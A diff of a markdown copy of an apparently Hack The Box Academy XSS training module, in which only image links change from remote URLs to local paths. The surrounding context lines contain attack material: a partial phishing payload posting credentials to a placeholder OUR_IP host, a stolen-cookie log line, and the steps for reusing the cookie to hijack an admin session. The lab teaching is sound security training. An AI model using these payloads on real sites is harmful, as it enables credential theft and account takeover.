@@ -10,7 +10,7 @@ A typical web application works by receiving the HTML code from the back-end ser
 
 XSS vulnerabilities are solely executed on the client-side and hence do not directly affect the back-end server. They can only affect the user executing the vulnerability. The direct impact of XSS vulnerabilities on the back-end server may be relatively low, but they are very commonly found in web applications, so this equates to a medium risk (`low impact + high probability = medium risk`), which we should always attempt to `reduce` risk by detecting, remediating, and proactively preventing these types of vulnerabilities.
 
-![Risk matrix with axes: Probability (low to high) and Impact (low to high), showing strategies: Reduce, Avoid, Accept, Transfer.](https://academy.hackthebox.com/storage/modules/103/xss_risk_chart_1.jpg)
+![Risk matrix with axes: Probability (low to high) and Impact (low to high), showing strategies: Reduce, Avoid, Accept, Transfer.](images/module-103-001.jpg)
 
 ---
 
@@ -51,7 +51,7 @@ The first and most critical type of XSS vulnerability is `Stored XSS` or `Persis
 This makes this type of XSS the most critical, as it affects a much wider audience since any user who visits the page would be a victim of this attack. Furthermore, Stored XSS may not be easily removable, and the payload may need removing from the back-end database.
 
 We can start the server below to view and practice a Stored XSS example. As we can see, the web page is a simple `To-Do List` app that we can add items to. We can try typing `test` and hitting enter/return to add a new item and see how the page handles it:
-![To-Do List interface with task input field and reset button.](https://academy.hackthebox.com/storage/modules/103/xss_stored_xss.jpg)
+![To-Do List interface with task input field and reset button.](images/module-103-003.jpg)
 
 As we can see, our input was displayed on the page. If no sanitization or filtering was applied to our input, the page might be vulnerable to XSS.
 
@@ -66,7 +66,7 @@ We can test whether the page is vulnerable to XSS with the following basic XSS p
 ```
 We use this payload as it is a very easy-to-spot method to know when our XSS payload has been successfully executed. Suppose the page allows any input and does not perform any sanitization on it. In that case, the alert should pop up with the URL of the page it is being executed on, directly after we input our payload or when we refresh the page:
 
-![IP address 139.59.166.56:31323 with OK button.](https://academy.hackthebox.com/storage/modules/103/xss_stored_xss_alert.jpg)
+![IP address 139.59.166.56:31323 with OK button.](images/module-103-002.jpg)
 
 As we can see, we did indeed get the alert, which means that the page is vulnerable to XSS, since our payload executed successfully. We can confirm this further by looking at the page source by clicking [`CTRL+U`] or right-clicking and selecting `View Page Source`, and we should see our payload in the page source:
 
@@ -101,15 +101,15 @@ There are two types of `Non-Persistent XSS` vulnerabilities: `Reflected XSS`, wh
 
 We can start the server below to practice on a web page vulnerable to a Reflected XSS vulnerability. It is a similar `To-Do List` app to the one we practiced with in the previous section. We can try adding any `test` string to see how it's handled:
 
-![To-Do List interface with a text input labeled 'Your Task' and an 'Add' button. Error message: 'Task 'test' could not be added.'](https://academy.hackthebox.com/storage/modules/103/xss_reflected_1.jpg)
+![To-Do List interface with a text input labeled 'Your Task' and an 'Add' button. Error message: 'Task 'test' could not be added.'](images/module-103-008.jpg)
 
 As we can see, we get `Task 'test' could not be added.`, which includes our input `test` as part of the error message. If our input was not filtered or sanitized, the page might be vulnerable to XSS. We can try the same XSS payload we used in the previous section and click `Add`:
 
-![To-Do List input with script tag 'alert(window.origin)</script>' and 'Add' button.](https://academy.hackthebox.com/storage/modules/103/xss_reflected_2.jpg)
+![To-Do List input with script tag 'alert(window.origin)</script>' and 'Add' button.](images/module-103-007.jpg)
 
 Once we click `Add`, we get the alert pop-up:
 
-![IP address 139.59.166.56:31323 with 'OK' button.](https://academy.hackthebox.com/storage/modules/103/xss_stored_xss_alert.jpg)
+![IP address 139.59.166.56:31323 with 'OK' button.](images/module-103-006.jpg)
 
 In this case, we see that the error message now says `Task '' could not be added.`. Since our payload is wrapped with a `<script>` tag, it does not get rendered by the browser, so we get empty single quotes `''` instead. We can once again view the page source to confirm that the error message includes our XSS payload:
 
@@ -125,11 +125,11 @@ If we visit the `Reflected` page again, the error message no longer appears, and
 
 This depends on which HTTP request is used to send our input to the server. We can check this through the Firefox `Developer Tools` by clicking [`CTRL+Shift+I`] and selecting the `Network` tab. Then, we can put our `test` payload again and click `Add` to send it:
 
-![Network tab showing HTTP requests: 200 status for localhost index.php, bootstrap.min.js, jquery.min.js; 404 status for localhost favicon.ico.](https://academy.hackthebox.com/storage/modules/103/xss_reflected_network.jpg)
+![Network tab showing HTTP requests: 200 status for localhost index.php, bootstrap.min.js, jquery.min.js; 404 status for localhost favicon.ico.](images/module-103-005.jpg)
 
 As we can see, the first row shows that our request was a `GET` request. `GET` request sends their parameters and data as part of the URL. So, `to target a user, we can send them a URL containing our payload`. To get the URL, we can copy the URL from the URL bar in Firefox after sending our XSS payload, or we can right-click on the `GET` request in the `Network` tab and select `Copy>Copy URL`. Once the victim visits this URL, the XSS payload would execute:
 
-![IP address 139.59.166.56:31323 with 'OK' button.](https://academy.hackthebox.com/storage/modules/103/xss_stored_xss_alert.jpg)
+![IP address 139.59.166.56:31323 with 'OK' button.](images/module-103-004.jpg)
 
 
 # DOM XSS
@@ -139,16 +139,16 @@ The third and final type of XSS is another `Non-Persistent` type called `DOM-bas
 
 We can run the server below to see an example of a web application vulnerable to DOM XSS. We can try adding a `test` item, and we see that the web application is similar to the `To-Do List` web applications we previously used:
 
-![To-Do List with input 'test' and 'Add' button. Next Task: test.](https://academy.hackthebox.com/storage/modules/103/xss_dom_1.jpg)
+![To-Do List with input 'test' and 'Add' button. Next Task: test.](images/module-103-012.jpg)
 
 However, if we open the `Network` tab in the Firefox Developer Tools, and re-add the `test` item, we would notice that no HTTP requests are being made:
 
-![Network tab instructions: Reload for network activity, click stopwatch for performance analysis.](https://academy.hackthebox.com/storage/modules/103/xss_dom_network.jpg)
+![Network tab instructions: Reload for network activity, click stopwatch for performance analysis.](images/module-103-011.jpg)
 
 We see that the input parameter in the URL is using a hashtag `#` for the item we added, which means that this is a client-side parameter that is completely processed on the browser. This indicates that the input is being processed at the client-side through JavaScript and never reaches the back-end; hence it is a `DOM-based XSS`.
 
 Furthermore, if we look at the page source by hitting [`CTRL+U`], we will notice that our `test` string is nowhere to be found. This is because the JavaScript code is updating the page when we click the `Add` button, which is after the page source is retrieved by our browser, hence the base page source will not show our input, and if we refresh the page, it will not be retained (i.e. `Non-Persistent`). We can still view the rendered page source with the Web Inspector tool by clicking [`CTRL+SHIFT+C`]:
-![HTML inspector showing links to Bootstrap and jQuery, with 'Next Task: test' in a list.](https://academy.hackthebox.com/storage/modules/103/xss_dom_inspector.jpg)
+![HTML inspector showing links to Bootstrap and jQuery, with 'Next Task: test' in a list.](images/module-103-010.jpg)
 
 ---
 
@@ -195,7 +195,7 @@ If we try the XSS payload we have been using previously, we will see that it wil
 
 The above line creates a new HTML image object, which has a `onerror` attribute that can execute JavaScript code when the image is not found. So, as we provided an empty image link (`""`), our code should always get executed without having to use `<script>` tags:
 
-![To-Do List with input 'or=alert(window.origin)>' and 'Add' button. Popup with IP 46.101.23.188:32648 and 'OK' button.](https://academy.hackthebox.com/storage/modules/103/xss_dom_alert.jpg)
+![To-Do List with input 'or=alert(window.origin)>' and 'Add' button. Popup with IP 46.101.23.188:32648 and 'OK' button.](images/module-103-009.jpg)
 
 To target a user with this DOM XSS vulnerability, we can once again copy the URL from the browser and share it with them, and once they visit it, the JavaScript code should execute. Both of these payloads are among the most basic XSS payloads. There are many instances where we may need to use various payloads depending on the security of the web application and the browser, which we will discuss in the next section.
 
@@ -325,7 +325,7 @@ To change a web page's background, we can choose a certain color or use an image
 
 Once we add our payload to the `To-Do` list, we will see that the background color changed:
 
-![To-Do List with 'Your Task' input and 'Reset' button.](https://academy.hackthebox.com/storage/modules/103/xss_defacing_background_color.jpg)
+![To-Do List with 'Your Task' input and 'Reset' button.](images/module-103-015.jpg)
 
 This will be persistent through page refreshes and will appear for anyone who visits the page, as we are utilizing a stored XSS vulnerability.
 
@@ -348,7 +348,7 @@ We can change the page title from `2Do` to any title of our choosing, using the 
 ```
 
 We can see from the page window/tab that our new title has replaced the previous one:
-![Browser tab showing HackTheBox Academy.](https://academy.hackthebox.com/storage/modules/103/xss_defacing_page_title.jpg)
+![Browser tab showing HackTheBox Academy.](images/module-103-014.jpg)
 
 ---
 
@@ -399,7 +399,7 @@ We will minify the HTML code into a single line and add it to our previous XSS p
 
 Once we add our payload to the vulnerable `To-Do` list, we will see that our HTML code is now permanently part of the web page's source code and shows our message for anyone who visits the page:
 
-![Cyber Security Training by Hack The Box.](https://academy.hackthebox.com/storage/modules/103/xss_defacing_change_text.jpg) 
+![Cyber Security Training by Hack The Box.](images/module-103-013.jpg) 
 
 By using three XSS payloads, we were able to successfully deface our target web page. If we look at the source code of the web page, we will see the original source code still exists, and our injected payloads appear at the end:
 
@@ -429,11 +429,11 @@ Furthermore, suppose we were to identify an XSS vulnerability in a web applicati
 
 We start by attempting to find the XSS vulnerability in the web application at `/phishing` from the server at the end of this section. When we visit the website, we see that it is a simple online image viewer, where we can input a URL of an image, and it'll display it:
 
-![Online Image Viewer with Hack The Box logo.](https://academy.hackthebox.com/storage/modules/103/xss_phishing_image_viewer.jpg)
+![Online Image Viewer with Hack The Box logo.](images/module-103-022.jpg)
 
 This form of image viewers is common in online forums and similar web applications. As we have control over the URL, we can start by using the basic XSS payload we've been using. But when we try that payload, we see that nothing gets executed, and we get the `dead image url` icon:
 
-![Online Image Viewer with Image URL input.](https://academy.hackthebox.com/storage/modules/103/xss_phishing_alert.jpg)
+![Online Image Viewer with Image URL input.](images/module-103-021.jpg)
 
 So, we must run the XSS Discovery process we previously learned to find a working XSS payload. `Before you continue, try to find an XSS payload that successfully executes JavaScript code on the page`.
 
@@ -482,7 +482,7 @@ document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><inp
 
 We can now inject this JavaScript code using our XSS payload (i.e., instead of running the `alert(window.origin)` JavaScript Code). In this case, we are exploiting a `Reflected XSS` vulnerability, so we can copy the URL and our XSS payload in its parameters, as we've done in the `Reflected XSS` section, and the page should look as follows when we visit the malicious URL:
 
-![Online Image Viewer with Image URL input and login fields.](https://academy.hackthebox.com/storage/modules/103/xss_phishing_injected_login_form.jpg)
+![Online Image Viewer with Image URL input and login fields.](images/module-103-020.jpg)
 
 ---
 
@@ -491,7 +491,7 @@ We can now inject this JavaScript code using our XSS payload (i.e., instead of r
 We can see that the URL field is still displayed, which defeats our line of "`Please login to continue`". So, to encourage the victim to use the login form, we should remove the URL field, such that they may think that they have to log in to be able to use the page. To do so, we can use the JavaScript function `document.getElementById().remove()` function.
 
 To find the `id` of the HTML element we want to remove, we can open the `Page Inspector Picker` by clicking [`CTRL+SHIFT+C`] and then clicking on the element we need:
-![Page Inspector Picker](https://academy.hackthebox.com/storage/modules/103/xss_page_inspector_picker.jpg)
+![Page Inspector Picker](images/module-103-016.jpg)
 
 As we see in both the source code and the hover text, the `url` form has the id `urlform`:
 
@@ -515,7 +515,7 @@ document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><inp
 
 When we try to inject our updated JavaScript code, we see that the URL form is indeed no longer displayed:
 
-![Online Image Viewer with Image URL input and login fields for Username and Password.](https://academy.hackthebox.com/storage/modules/103/xss_phishing_injected_login_form_2.jpg)
+![Online Image Viewer with Image URL input and login fields for Username and Password.](images/module-103-019.jpg)
 
 We also see that there's still a piece of the original HTML code left after our injected login form. This can be removed by simply commenting it out, by adding an HTML opening comment after our XSS payload:
 
@@ -525,7 +525,7 @@ We also see that there's still a piece of the original HTML code left after our 
 
 As we can see, this removes the remaining bit of original HTML code, and our payload should be ready. The page now looks like it legitimately requires a login:
 
-![Online Image Viewer with Username and Password login fields.](https://academy.hackthebox.com/storage/modules/103/xss_phishing_injected_login_form_3.jpg)
+![Online Image Viewer with Username and Password login fields.](images/module-103-018.jpg)
 
 We can now copy the final URL that should include the entire payload, and we can send it to our victims and attempt to trick them into using the fake login form. You can try visiting the URL to ensure that it will display the login form as intended. Also try logging into the above login form and see what happens.
 
@@ -587,7 +587,7 @@ PHP 7.4.15 Development Server (http://0.0.0.0:80) started
 
 Let's try logging into the injected login form and see what we get. We see that we get redirected to the original Image Viewer page:
 
-![Online Image Viewer with Image URL input.](https://academy.hackthebox.com/storage/modules/103/xss_image_viewer.jpg)
+![Online Image Viewer with Image URL input.](images/module-103-017.jpg)
 
 If we check the `creds.txt` file in our Pwnbox, we see that we did get the login credentials:
 
@@ -621,10 +621,10 @@ Blind XSS vulnerabilities usually occur with forms only accessible by certain us
 
 Let's run the test on the web application on (`/hijacking`) in the server at the end of this section. We see a User Registration page with multiple fields, so let's try to submit a `test` user to see how the form handles the data:
 
-![User Registration form with fields for name, username, password, email, and website, and a 'Register' button.](https://academy.hackthebox.com/storage/modules/103/xss_blind_test_form.jpg)
+![User Registration form with fields for name, username, password, email, and website, and a 'Register' button.](images/module-103-026.jpg)
 
 As we can see, once we submit the form we get the following message:
-![Thank you for registering. An Admin will review your registration request.](https://academy.hackthebox.com/storage/modules/103/xss_blind_test_form_output.jpg)
+![Thank you for registering. An Admin will review your registration request.](images/module-103-025.jpg)
 
 This indicates that we will not see how our input will be handled or how it will look in the browser since it will appear for the Admin only in a certain Admin Panel that we do not have access to. In normal (i.e., non-blind) cases, we can test each field until we get an `alert` box, like what we've been doing throughout the module. However, as we do not have access over the Admin panel in this case, `how would we be able to detect an XSS vulnerability if we cannot see how the output is handled?`
 
@@ -759,11 +759,11 @@ Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
 
 Finally, we can use this cookie on the `login.php` page to access the victim's account. To do so, once we navigate to `/hijacking/login.php`, we can click `Shift+F9` in Firefox to reveal the `Storage` bar in the Developer Tools. Then, we can click on the `+` button on the top right corner and add our cookie, where the `Name` is the part before `=` and the `Value` is the part after `=` from our stolen cookie:
 
-![Storage tab showing cookie details: Name 'cookie', Value 'f904f93c949d19d870911bf8b05fe7b2', Path '/hijacking', Size 38.](https://academy.hackthebox.com/storage/modules/103/xss_blind_set_cookie_2.jpg)
+![Storage tab showing cookie details: Name 'cookie', Value 'f904f93c949d19d870911bf8b05fe7b2', Path '/hijacking', Size 38.](images/module-103-024.jpg)
 
 Once we set our cookie, we can refresh the page and we will get access as the victim:
 
-![Welcome Back Admin.](https://academy.hackthebox.com/storage/modules/103/xss_blind_hijacked_session.jpg)
+![Welcome Back Admin.](images/module-103-023.jpg)
 
 
 # XSS Prevention
@@ -921,7 +921,7 @@ We are performing a Web Application Penetration Testing task for a company that 
 
 Start the server below, make sure you are connected to the VPN, and access the `/assessment` directory on the server using the browser:
 
-![Welcome to Security Blog. Announcement of new posts and stories from security fields, with feedback encouraged.](https://academy.hackthebox.com/storage/modules/103/xss_skills_assessment_website.jpg)
+![Welcome to Security Blog. Announcement of new posts and stories from security fields, with feedback encouraged.](images/module-103-027.jpg)
 
 Apply the skills you learned in this module to achieve the following:
 1. Identify a user-input field that is vulnerable to an XSS vulnerability
